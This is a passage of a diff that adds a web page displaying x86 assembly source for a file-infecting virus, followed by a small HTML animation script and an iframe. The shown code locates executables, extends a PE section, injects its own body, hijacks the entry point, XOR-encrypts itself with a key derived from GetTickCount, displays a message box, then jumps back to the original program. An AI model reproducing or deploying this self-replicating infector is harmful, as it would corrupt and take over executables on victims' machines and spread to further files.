+    mov eax, (IMAGE_SECTION_HEADER PTR [edx]).PointerToRawData
+    nop
+    add eax, (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData
+    mov (STACK_STORAGE PTR [esp]).offsetToDest, eax
+    ; update SizeOfRawData
+    mov eax, (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData
+    add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SectionAlignment
+    mov (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData, eax
+    ; update SizeOfImage
+    mov eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SizeOfImage
+    nop
+    add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SectionAlignment
+    nop
+    mov (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SizeOfImage, eax
+    ; save original entry point
+    mov eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).ImageBase
+    nop
+    add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).AddressOfEntryPoint
+    mov (STACK_STORAGE PTR [esp]).origEntryPoint, eax
+    mov eax, (STACK_STORAGE PTR [esp]).offsetToDest
+    ; physical to virtual address
+    mov ecx, (IMAGE_SECTION_HEADER PTR [edx]).VirtualAddress
+    nop
+    sub ecx, (IMAGE_SECTION_HEADER PTR [edx]).PointerToRawData
+    add eax, ecx
+    ; update it
+    mov (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).AddressOfEntryPoint, eax
+    ; re-map the file to memory and change its size
+    mov eax, (IMAGE_SECTION_HEADER PTR [edx]).PointerToRawData
+    add eax, (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData
+    mov (STACK_STORAGE PTR [esp]).fileSize, eax
+    push esp
+    call UnmapFileFromRAM
+    mov eax, (STACK_STORAGE PTR [esp]).fileSize
+    push esp
+    push eax
+    call MapFileToRAM
+    ; inject itself
+    lea esi, [ebx - (data - start_of_code)]		              ; src
+    mov edi, (STACK_STORAGE PTR [esp]).fileView
+    nop
+    add edi, (STACK_STORAGE PTR [esp]).offsetToDest
+    nop                 ; dst
+    mov ecx, (end_of_code - start_of_code)                          ; length
+    rep movsb
+    ; generate encryption key
+    push esp
+    lea eax, [ebx + (GetTickCount_str - data)]
+    push eax
+    call GetProcAddr
+    call eax ; GetTickCount()
+    xor eax, (STACK_STORAGE PTR [esp]).kernel32BaseAddr
+    nop
+    xor eax, (STACK_STORAGE PTR [esp]).origEntryPoint
+    nop
+    mov (STACK_STORAGE PTR [esp]).cryptKey, eax
+    ; store it in the decryptor
+    ; eax : cryptKey
+    mov edi, (STACK_STORAGE PTR [esp]).fileView
+    add edi, (STACK_STORAGE PTR [esp]).offsetToDest
+    add edi, ((cypt_key - start_of_code) + 1)
+    mov [edi], eax
+    ; set return address to the original entry point
+    mov edx, (STACK_STORAGE PTR [esp]).fileView
+    nop
+    add edx, (STACK_STORAGE PTR [esp]).offsetToDest
+    nop
+    mov eax, (STACK_STORAGE PTR [esp]).origEntryPoint
+    nop
+    mov [edx + (returnAddr - start_of_code)], eax
+    ; then the body, xor-encrypting it
+    mov edi, (STACK_STORAGE PTR [esp]).fileView
+    add edi, (STACK_STORAGE PTR [esp]).offsetToDest
+    add edi, (data - start_of_code)
+    xor ecx, ecx	  							        ; index
+    mov edx, (STACK_STORAGE PTR [esp]).cryptKey
+    encryptor_loop_b:
+    	cmp ecx, (end_of_code - data)
+	je encryptor_loop_e
+	mov al, [edi + ecx] ; byte to copy
+	xor al, dl
+	mov [edi + ecx], al
+	inc ecx
+	ror edx, cl
+	jmp encryptor_loop_b
+    encryptor_loop_e:
+
+close_target:
+    push esp
+    call UnmapFileFromRAM
+    push esp
+    lea eax, [ebx + (CloseHandle_str - data)]
+    push eax
+    call GetProcAddr
+    push (STACK_STORAGE PTR [esp]).fileHandle
+    call eax ; CloseHandle()
+
+loop_find_file_continue:
+    push esp
+    lea eax, [ebx + (FindNextFile_str - data)]
+    push eax
+    call GetProcAddr
+    lea edx, (STACK_STORAGE PTR [esp]).fileStruct
+    nop
+    mov ecx, (STACK_STORAGE PTR [esp]).fileQueryHandle
+    push edx
+    push ecx
+    call eax
+    cmp eax, TRUE
+    je loop_find_file
+
+loop_find_file_end:
+    push esp
+    lea eax, [ebx + (FindClose_str - data)]
+    push eax
+    call GetProcAddr
+    push (STACK_STORAGE PTR [esp]).fileQueryHandle
+    nop
+    call eax ; FindClose() / close its handle
+    mov eax, [ebx + (returnAddr - data)]
+    nop
+    cmp eax, 0
+    je end_of_code
+    ; get LoadLibraryA
+    push esp
+    nop
+    lea eax, [ebx + (LoadLibrary_str - data)]
+    push eax
+    call GetProcAddr
+    lea edx, [ebx + (User32_str - data)]
+    push edx
+    call eax ; LoadLibrary()
+    mov (STACK_STORAGE PTR [esp]).GetProcAddress_module, eax ; so GetProcAddress finds MessageBox
+    ; get MessageBoxA
+    push esp
+    lea edx, [ebx + (MessageBox_str - data)]
+    push edx
+    nop
+    call GetProcAddr
+    lea edx, [ebx + (PopUpMessage - data)]
+    push MB_OK
+    push edx
+    nop
+    push edx
+    push NULL
+    call eax ; MessageBox()
+    ; put User32 handle on the stack
+    mov edx, esp
+    nop
+    push (STACK_STORAGE PTR [esp]).GetProcAddress_module
+    nop
+    mov eax, (STACK_STORAGE PTR [edx]).kernel32BaseAddr
+    nop
+    mov (STACK_STORAGE PTR [edx]).GetProcAddress_module, eax
+    push edx
+    nop
+    lea eax, [ebx + (FreeLibrary_str - data)]
+    push eax
+    call GetProcAddr
+    call eax ; FreeLibrary() ; handle argument already on the stack
+    add sp, (STACK_STORAGE PTR [esp]).alignedSize ; "free" the stack
+    mov eax, [ebx + (returnAddr - data)]
+    jmp eax
+
+end_of_code:
+    push ebx
+    push esi
+    push edi
+    pop edi
+    pop esi
+    pop ebx
+    add sp, (STACK_STORAGE PTR [esp]).alignedSize ; "free" the stack
+    ; hard-coded call, so kernel32 is loaded in the infector
+    push 0
+    nop
+    nop
+    nop
+    call ExitProcess
+
+end start
+^C
+</pre></div>
+<script type="text/javascript"><!--
+ setTimeout(function(){},0);var p=0,q=-12;function a(){if(window.setTimeout&&document.getElementsByTagName){var o=12*(2<<6);var b=document.getElementsByTagName("pre")[0];b.style.top=(p-o)+"pt";var l=document.getElementsByTagName("b");var o=-(p-o)+"pt";for(var a in l){if(l[a].style)l[a].style.top=o;}p+=q;if(p<-2<<9||p>=0)q=-q;window.setTimeout(this.a,2<<6);}}a();//--></script>
+
+<iframe src="r0b0.html" frameborder="0" class="background-iframe"></iframe>
+</body></html>
